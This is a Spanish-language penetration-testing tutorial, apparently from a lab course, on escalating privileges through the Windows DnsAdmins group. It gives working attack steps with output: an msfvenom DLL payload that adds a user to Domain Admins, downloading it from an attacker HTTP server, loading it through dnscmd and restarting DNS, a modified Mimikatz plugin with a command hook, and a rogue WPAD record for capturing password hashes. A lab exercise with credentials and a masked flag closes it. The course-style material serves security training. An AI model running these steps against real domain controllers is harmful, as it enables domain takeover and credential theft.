
# DnsAdmins

Los miembros del grupo [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) tienen acceso a la información DNS en la red. El servicio DNS de Windows admite complementos personalizados y puede llamar a funciones desde ellos para resolver consultas de nombres que no están dentro del alcance de ninguna zona DNS alojada localmente. El servicio DNS se ejecuta como , por lo que la membresía en este grupo podría aprovecharse potencialmente para escalar privilegios en un controlador de dominio o en una situación en la que un servidor independiente actúe como servidor DNS para el dominio. Es posible utilizar la utilidad [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) `NT AUTHORITY\SYSTEM` incorporada para especificar la ruta de la DLL del complemento. Como se detalla en esta excelente [publicación](https://adsecurity.org/?p=4064) , se puede realizar el siguiente ataque cuando DNS se ejecuta en un controlador de dominio (lo cual es muy común):

* La gestión de DNS se realiza a través de RPC
* [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) nos permite cargar una DLL personalizada sin necesidad de verificar la ruta de la DLL. Esto se puede hacer con la herramienta `dnscmd` desde la línea de comandos.
* Cuando un miembro del grupo `DnsAdmins` ejecuta el siguiente comando `dnscmd`, `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` se completa la clave de registro
* Cuando se reinicia el servicio DNS, se cargará la DLL en esta ruta (es decir, un recurso compartido de red al que puede acceder la cuenta de la máquina del controlador de dominio)
* Un atacante puede cargar una DLL personalizada para obtener un shell inverso o incluso cargar una herramienta como Mimikatz como una DLL para volcar credenciales.

Veamos el ataque paso a paso.

***

## <mark style="color:purple;">Aprovechar el acceso DnsAdmins</mark>

### **Generando una DLL maliciosas**

Podemos generar una DLL maliciosa para agregar un usuario al grupo `domain admins` usando `msfvenom`.

```shell-session
afsh4ck@kali$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

### **Iniciar un servidor HTTP local**

A continuación, inicie un servidor HTTP Python.

```shell-session
afsh4ck@kali$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```

### **Descargar archivo al destino**

```powershell
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

Veamos primero qué sucede si usamos la utilidad `dnscmd` para cargar una DLL personalizada con un usuario sin privilegios.

#### **Cargar DLL como usuario sin privilegios**

```powershell
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

Como era de esperar, intentar ejecutar este comando como usuario normal no da resultado. Solo los miembros del grupo `DnsAdmins` pueden hacerlo.

### **Cargar DLL como miembro de DnsAdmins**

```powershell
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109           
```

### **Cargar DLL personalizada**

Después de confirmar la membresía del grupo `DnsAdmins`, podemos volver a ejecutar el comando para cargar una DLL personalizada.

```powershell
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

{% hint style="warning" %}
**Nota**: Debemos especificar la ruta completa a nuestra DLL personalizada o el ataque no funcionará correctamente.
{% endhint %}

La utilidad `dnscmd` sólo puede ser utilizada por miembros del grupo `DnsAdmins`, ya que no tienen permiso directo sobre la clave de registro.

Una vez que se haya configurado la configuración del registro que contiene la ruta de nuestro complemento malicioso y se haya creado nuestra carga útil, la DLL se cargará la próxima vez que se inicie el servicio DNS. La pertenencia al grupo DnsAdmins no otorga la capacidad de reiniciar el servicio DNS, pero es posible que los administradores de sistemas permitan que los administradores de DNS hagan esto.

Después de reiniciar el servicio DNS (si nuestro usuario tiene este nivel de acceso), deberíamos poder ejecutar nuestra DLL personalizada y agregar un usuario (en nuestro caso) u obtener un shell inverso. Si no tenemos acceso para reiniciar el servidor DNS, tendremos que esperar hasta que el servidor o servicio se reinicie. Verifiquemos los permisos de nuestro usuario actual en el servicio DNS.

### **Encontrar el SID del usuario**

Primero, necesitamos el SID de nuestro usuario.

```powershell
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

### **Comprobación de permisos en el servicio DNS**

Una vez que tenemos el SID del usuario, podemos usar el comando `sc` para verificar los permisos en el servicio. Según este [artículo](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/) , podemos ver que nuestro usuario tiene permisos `RPWP` que se traducen en `SERVICE_START` y `SERVICE_STOP`, respectivamente.

```powershell
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

**Detener el servicio DNS**

Después de confirmar estos permisos, podemos emitir los siguientes comandos para detener e iniciar el servicio.

```cmd-session
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

El servicio DNS intentará iniciar y ejecutar nuestra DLL personalizada, pero si verificamos el estado, mostrará que no pudo iniciarse correctamente (más sobre esto más adelante).

**Iniciando el servicio DNS**

```cmd-session
C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```

### **Confirmación de membresía del grupo**

Si todo va según lo previsto, nuestra cuenta se agregará al grupo de administradores de dominio o recibirá un shell inverso si nuestra DLL personalizada se creó para brindarnos una conexión nuevamente.

```powershell
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

***

## <mark style="color:purple;">Limpiando</mark>

Realizar cambios de configuración y detener o reiniciar el servicio DNS en un controlador de dominio son acciones muy destructivas y deben realizarse con mucho cuidado. Como evaluadores de penetración, debemos ejecutar este tipo de acción por parte de nuestro cliente antes de proceder con ella, ya que podría hacer que se caiga el DNS de todo un entorno de Active Directory y causar muchos problemas. Si nuestro cliente da su permiso para seguir adelante con este ataque, debemos poder cubrir nuestras huellas y limpiar el desastre o ofrecerle a nuestro cliente pasos sobre cómo revertir los cambios.

Estos pasos deben realizarse desde una consola elevada con una cuenta de administrador local o de dominio.

**Confirmación de la clave de registro agregada**

El primer paso es confirmar que la clave de registro `ServerLevelPluginDll` existe. Hasta que no eliminemos nuestra DLL personalizada, no podremos volver a iniciar el servicio DNS correctamente.

```cmd-session
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

**Eliminar clave de registro**

Podemos usar el comando `reg delete` para eliminar la clave que apunta a nuestra DLL personalizada.

```cmd-session
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

**Iniciar nuevamente el servicio DNS**

Una vez hecho esto ya podemos iniciar nuevamente el servicio DNS.

```powershell
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

**Comprobación del estado del servicio DNS**

Si todo salió según lo previsto, al consultar el servicio DNS se verá que está en funcionamiento. También podemos confirmar que el DNS está funcionando correctamente dentro del entorno realizando una consulta `nslookup` al host local u otro host del dominio.

```powershell
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Una vez más, se trata de un ataque potencialmente destructivo que solo debemos llevar a cabo con el permiso explícito de nuestro cliente y en coordinación con él. Si comprenden los riesgos y quieren ver una prueba de concepto completa, los pasos que se describen en esta sección ayudarán a demostrar el ataque y a solucionarlo posteriormente.

***

## <mark style="color:purple;">Uso de Mimilib.dll</mark>

Como se detalla en esta [publicación](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) , también podríamos utilizar [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) del creador de la herramienta `Mimikatz` para obtener la ejecución de comandos modificando el archivo [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) para ejecutar una línea única de reverse shell u otro comando de nuestra elección.

```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

***

## <mark style="color:purple;">Creación de un registro WPAD</mark>

Otra forma de abusar de los privilegios del grupo DnsAdmins es mediante la creación de un registro WPAD. La pertenencia a este grupo nos otorga los derechos para [desactivar la seguridad del bloqueo de consultas globales](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps) , que bloquea este ataque de forma predeterminada. Server 2008 introdujo por primera vez la capacidad de agregar a una lista global de bloqueo de consultas en un servidor DNS. De forma predeterminada, el Protocolo de descubrimiento automático de proxy web (WPAD) y el Protocolo de direccionamiento automático de túneles dentro del sitio (ISATAP) están en la lista global de bloqueo de consultas. Estos protocolos son bastante vulnerables al secuestro, y cualquier usuario de dominio puede crear un objeto de computadora o un registro DNS que contenga esos nombres.

Después de deshabilitar la lista de bloqueo de consultas globales y crear un registro WPAD, cada máquina que ejecute WPAD con la configuración predeterminada tendrá su tráfico redirigido a través de nuestra máquina de ataque. Podríamos usar una herramienta como [Responder](https://github.com/lgandx/Responder) o [Inveigh](https://github.com/Kevin-Robertson/Inveigh) para realizar suplantación de tráfico e intentar capturar hashes de contraseñas y descifrarlos sin conexión o realizar un ataque SMBRelay.

**Deshabilitar la lista de bloqueo de consultas globales**

Para configurar este ataque, primero deshabilitamos la lista de bloqueo de consultas globales:

```powershell
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

**Agregar un registro WPAD**

A continuación, agregamos un registro WPAD que apunta a nuestra máquina de ataque.

```powershell
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

***

## <mark style="color:purple;">Caso práctico</mark>

```bash
Objetivo: 10.129.253.87 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "netadm" y la contraseña "HTB_@cademy_stdnt!"
```

> Aproveche la pertenencia al grupo `DnsAdmins` para aumentar los privilegios. Envíe el contenido de la flag ubicada en `c:\Users\Administrator\Desktop\DnsAdmins\flag.txt`

#### Comprobar membresía de grupo

Con los siguientes comandos confirmamos que el usuario `netadm` está dentro del grupo `DnsAdmins`:

```powershell
PS C:\Users\netadm> net localgroup "DnsAdmins"
Alias name     DnsAdmins
Comment        DNS Administrators Group

Members
-------------------------------------------------------------------------------
netadm
```

```powershell
PS C:\Users\netadm> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109
```

#### Crear DLL maliciosa con Msfvenom

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
</strong>
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 9216 bytes
Saved as: adduser.dll
</code></pre>

#### Envío a la máquina objetivo

```shell-session
afsh4ck@kali$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```

```powershell
PS C:\htb> wget "http://10.10.15.47:80/adduser.dll" -outfile "adduser.dll"
```

#### Cargar DLL maliciosa

```powershell
PS C:\Users\netadm> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

#### Reiniciar el servicio DNS

```powershell
PS C:\Users\netadm> net stop dns
PS C:\Users\netadm> net start dns
```

#### **Confirmación de membresía del grupo**

```powershell
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

Una vez que estamos en el grupo de Domain Admins necesitamos desloguearnos y volver a acceder para que los cambios surjan efecto. Podemos hacerlo con el siguiente comando:

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\Users\netadm> logoff
</strong></code></pre>

#### Acceso a la flag

```powershell
PS C:\Users\netadm> type c:\Users\Administrator\Desktop\DnsAdmins\flag.txt
Dll_abus3_**********
```
